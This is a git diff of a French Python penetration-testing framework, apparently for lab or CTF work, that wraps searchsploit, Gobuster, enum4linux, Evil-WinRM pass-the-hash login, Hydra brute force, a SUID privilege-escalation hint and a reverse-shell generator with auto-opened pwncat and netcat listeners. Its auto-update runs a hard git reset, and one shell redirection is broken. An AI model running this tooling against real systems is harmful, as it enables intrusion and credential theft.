@@ -15,11 +15,13 @@ donnees_rapport = {
     "cible": "", "date": "", "ports": [], "vulns": [], "mots_de_passe": []
 }
 
-# --- SYSTÈME D'AUTO-UPDATE ---
+# --- SYSTÈME D'AUTO-UPDATE (Secours interne) ---
 def auto_update():
     if os.path.exists(".git"):
         console.print("[dim cyan][*] Recherche de mises à jour sur GitHub...[/dim cyan]")
         try:
+            subprocess.run(["git", "fetch", "--all"], capture_output=True, timeout=5)
+            subprocess.run(["git", "reset", "--hard", "origin/main"], capture_output=True, timeout=5)
             res = subprocess.run(["git", "pull"], capture_output=True, text=True, timeout=5)
             if "Already up to date" not in res.stdout and "files changed" in res.stdout:
                 console.print("[bold yellow][!] Nouvelle version détectée et téléchargée ! Redémarrage...[/bold yellow]")
@@ -70,29 +72,82 @@ def scan_target(ip):
 # --- ÉTAPE 2 : SEARCHSPLOIT INTELLIGENT (ANTI-DOUBLONS) ---
 def run_searchsploit(open_ports):
     console.print("\n[bold yellow][*] Recherche d'Exploits (Smart Mode)...[/bold yellow]")
-    services_deja_vus = set() # Notre mémoire anti-doublons
+    services_deja_vus = set()
 
     for p in open_ports:
         product = p['product'].split()[0] if p['product'] else p['service']
         version = p['version'].split()[0] if p['version'] else ""
         
-        # Signature unique du service
+        # Ignorer le mot "inconnue"
+        if version.lower() == "inconnue":
+            version = ""
+
         signature = f"{product}_{version}"
-        if signature in services_deja_vus:
-            continue # Si on l'a déjà vu, on passe au suivant !
+        if not product or signature in services_deja_vus:
+            continue
         
-        services_deja_vus.add(signature) # On l'ajoute à la mémoire
+        services_deja_vus.add(signature)
         
-        # 1. Recherche Large
         console.print(f"\n[bold blue]🔍 Test générique : {product}[/bold blue]")
         subprocess.run(["searchsploit", "--disable-colour", product])
         
-        # 2. Recherche Précise
         if version:
             console.print(f"[bold magenta]🎯 Test précis : {product} {version}[/bold magenta]")
             subprocess.run(["searchsploit", "--disable-colour", product, version])
+        else:
+            console.print(f"[dim yellow]ℹ️ Version non détectée pour {product}, scan précis ignoré.[/dim yellow]")
 
-# --- ÉTAPE 3 : BRUTEFORCE (HYDRA) ---
+# --- ÉTAPE 3 : WEB (GOBUSTER DYNAMIQUE) ---
+def run_web_enum(ip, open_ports):
+    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
+    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
+    
+    console.print("\n[bold yellow][*] Création du dictionnaire 'Juicy'...[/bold yellow]")
+    juicy_words = ["admin", "panel", "password", "pass", "user", "users", "login", "backup", "db", "config", "secret", "api", "test", "dev", ".git", ".env"]
+    with open("juicy_words.txt", "w") as f:
+        for word in juicy_words: f.write(f"{word}\n")
+
+    for port in web_ports:
+        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
+        console.print(f"\n[bold cyan]=== Profilage WhatWeb pour {url} ===[/bold cyan]")
+        try:
+            res = subprocess.run(["whatweb", "--color=never", url], capture_output=True, text=True)
+            if res.stdout:
+                for techno in res.stdout.strip().split(', '): console.print(f"> {techno}")
+        except Exception: pass
+
+        console.print(f"\n[bold yellow][*] Fuzzing Gobuster en cours sur {url}...[/bold yellow]")
+        wordlist = "juicy_words.txt"
+        if os.path.exists("common.txt"):
+            subprocess.run(["cat", "common.txt", ">>", "juicy_words.txt"]) # Fusion
+            
+        try:
+            process = subprocess.Popen(["gobuster", "dir", "-u", url, "-w", wordlist, "-q", "-t", "20"], stdout=subprocess.PIPE, text=True)
+            for line in process.stdout:
+                if "Status: 200" in line or "Status: 301" in line:
+                    console.print(f"[bold green][+] {line.strip()}[/bold green]")
+        except KeyboardInterrupt: pass
+
+# --- ÉTAPE 4 : ARSENAL WINDOWS (WINRM & ENUM4LINUX) ---
+def windows_arsenal(ip):
+    console.print("\n[bold cyan]🪟  ARSENAL WINDOWS 🪟[/bold cyan]")
+    table = Table(show_header=False)
+    table.add_row("1", "Enum4Linux (Scan complet SMB/Utilisateurs/Domaine)")
+    table.add_row("2", "Evil-WinRM (Connexion Shell via Hash/Mot de passe)")
+    console.print(table)
+    
+    choix = questionary.select("Choisis ton arme :", choices=["1", "2"]).ask()
+    
+    if choix == "1":
+        console.print(f"\n[bold yellow][*] Lancement d'Enum4Linux sur {ip}...[/bold yellow]")
+        subprocess.run(["enum4linux", "-a", ip])
+    elif choix == "2":
+        user = questionary.text("Nom d'utilisateur :").ask()
+        password = questionary.text("Mot de passe ou Hash NTLM :").ask()
+        console.print(f"\n[bold yellow][*] Connexion WinRM en cours...[/bold yellow]")
+        subprocess.run(["evil-winrm", "-i", ip, "-u", user, "-p", password])
+
+# --- ÉTAPE 5 : BRUTEFORCE (HYDRA) ---
 def run_hydra(ip, open_ports):
     cibles = [p for p in open_ports if any(s in p['service'].lower() for s in ['ssh', 'ftp'])]
     if not cibles: return console.print("[bold red]Aucun port bruteforçable détecté.[/bold red]")
@@ -107,63 +162,24 @@ def run_hydra(ip, open_ports):
             if "login:" in line.lower(): console.print(f"[bold green]>>> SUCCÈS : {line.strip()} <<<[/bold green]")
     except Exception as e: console.print(f"[bold red]Erreur : {e}[/bold red]")
 
-# --- ÉTAPE 4 : WEB (GOBUSTER & WHATWEB) ---
-def run_web_enum(ip, open_ports):
-    web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080]]
-    if not web_ports: return console.print("[bold red]Aucun port Web détecté.[/bold red]")
-    
-    for port in web_ports:
-        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}"
-        
-        # WhatWeb
-        console.print(f"\n[bold cyan]=== Profilage WhatWeb pour {url} ===[/bold cyan]")
-        try:
-            res = subprocess.run(["whatweb", "--color=never", url], capture_output=True, text=True)
-            if res.stdout:
-                for techno in res.stdout.strip().split(', '):
-                    console.print(f"> {techno}")
-                    if "]" in techno and "[" in techno:
-                        donnees_rapport["vulns"].append({"outil": "WhatWeb", "nom": techno, "severite": "Info"})
-        except Exception: pass
-
-        # Gobuster
-        console.print(f"\n[bold yellow][*] Fuzzing Gobuster en cours sur {url}...[/bold yellow]")
-        try:
-            process = subprocess.Popen(["gobuster", "dir", "-u", url, "-w", "common.txt", "-q", "-t", "20"], stdout=subprocess.PIPE, text=True)
-            for line in process.stdout:
-                if "Status: 200" in line or "Status: 301" in line:
-                    console.print(f"[bold green][+] {line.strip()}[/bold green]")
-        except KeyboardInterrupt: pass
-
-# --- ÉTAPE 5 : SMB/NFS (NOUVEAU) ---
-def run_smb_enum(ip):
-    console.print(f"\n[bold yellow][*] Énumération des partages SMB sur {ip}...[/bold yellow]")
-    try:
-        subprocess.run(["smbclient", "-L", f"//{ip}/", "-N"])
-    except FileNotFoundError:
-        console.print("[red]smbclient n'est pas installé sur cette machine.[/red]")
-
-# --- ÉTAPE 6 : PRIVESC (NOUVEAU) ---
+# --- ÉTAPE 6 : PRIVESC (SUID) ---
 def run_suid_helper():
     console.print(Panel("[bold red]LANCE CETTE COMMANDE SUR LA CIBLE (SSH/Shell) :[/bold red]\n\n[green]find / -perm -u=s -type f 2>/dev/null[/green]", title="Escalade SUID"))
-    console.print("[dim]Cette commande listera les fichiers qui peuvent te donner les droits ROOT (ex: /usr/bin/menu).[/dim]")
 
-# --- ÉTAPE 7 : REVERSE SHELLS (AVEC AUTO-LISTENER) ---
+# --- ÉTAPE 7 : REVERSE SHELLS (AVEC PWNCAT C2) ---
 def run_payload_generator():
-    console.print("\n[bold red]☠️  USINE À REVERSE SHELLS ☠️[/bold red]")
+    console.print("\n[bold red]☠️  USINE À REVERSE SHELLS (SUPER C2) ☠️[/bold red]")
     ip = questionary.text("Ton IP d'écoute (ex: tun0) :").ask()
     port = questionary.text("Ton port d'écoute :", default="4444").ask()
     
-    # === LA MAGIE : OUVERTURE DU TERMINAL AUTOMATIQUE ===
-    console.print(f"\n[bold yellow][*] Ouverture automatique du Listener sur le port {port}...[/bold yellow]")
+    console.print(f"\n[bold yellow][*] Ouverture du Super Listener (Pwncat) sur le port {port}...[/bold yellow]")
     try:
-        # Lance x-terminal-emulator (le terminal par défaut de Kali) avec la commande Netcat
-        cmd_listener = f"bash -c 'sudo nc -lvnp {port}; exec bash'"
+        # Pwncat stabilisera le shell automatiquement. S'il plante, on fallback sur Netcat.
+        cmd_listener = f"bash -c 'sudo pwncat-cs -lp {port} || sudo nc -lvnp {port}; exec bash'"
         subprocess.Popen(["x-terminal-emulator", "-e", cmd_listener])
-        console.print("[bold green][+] Fenêtre du Listener ouverte avec succès ![/bold green]\n")
+        console.print("[bold green][+] Fenêtre du C2 ouverte ! (Fais Ctrl+D pour revenir au framework local quand tu auras le shell)[/bold green]\n")
     except Exception as e:
-        console.print(f"[dim red]Échec de l'ouverture auto, lance : sudo nc -lvnp {port}[/dim red]\n")
-    # ====================================================
+        console.print(f"[dim red]Échec de l'ouverture auto, lance : sudo pwncat-cs -lp {port}[/dim red]\n")
 
     table = Table(title=f"Payloads pour {ip}:{port}", show_lines=True)
     table.add_column("Type", style="magenta"); table.add_column("Commande", style="green")
@@ -188,20 +204,20 @@ def interactive_menu(ip, open_ports):
             "💻 Que voulez-vous faire ?",
             choices=[
                 "1. Recherche d'exploits (Searchsploit Intelligent)",
-                "2. Énumération Web (WhatWeb & Gobuster)",
-                "3. Énumération SMB (Partages)",
+                "2. Énumération Web (WhatWeb & Gobuster Dynamique)",
+                "3. Arsenal Windows (Enum4Linux & WinRM)",
                 "4. Bruteforce (Hydra)",
-                "5. Usine à Reverse Shells",
+                "5. Usine à Reverse Shells (Super C2 Pwncat)",
                 "6. Aide Escalade de Privilèges (SUID)",
                 "7. Générer Rapport & Quitter"
             ]
         ).ask()
         
-        if not choix: sys.exit() # Gère le Ctrl+C dans le menu
+        if not choix: sys.exit()
         
         if "1." in choix: run_searchsploit(open_ports)
         elif "2." in choix: run_web_enum(ip, open_ports)
-        elif "3." in choix: run_smb_enum(ip)
+        elif "3." in choix: windows_arsenal(ip)
         elif "4." in choix: run_hydra(ip, open_ports)
         elif "5." in choix: run_payload_generator()
         elif "6." in choix: run_suid_helper()
@@ -211,7 +227,7 @@ def interactive_menu(ip, open_ports):
 
 if __name__ == "__main__":
     auto_update()
-    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V15[/bold red]", subtitle="Elite Red Team Edition"))
+    console.print(Panel.fit("[bold red]CYBER FRAMEWORK V16[/bold red]", subtitle="Elite Red Team Edition"))
     
     if len(sys.argv) > 1:
         cible = sys.argv[1].replace("https://", "").replace("http://", "").split("/")[0]
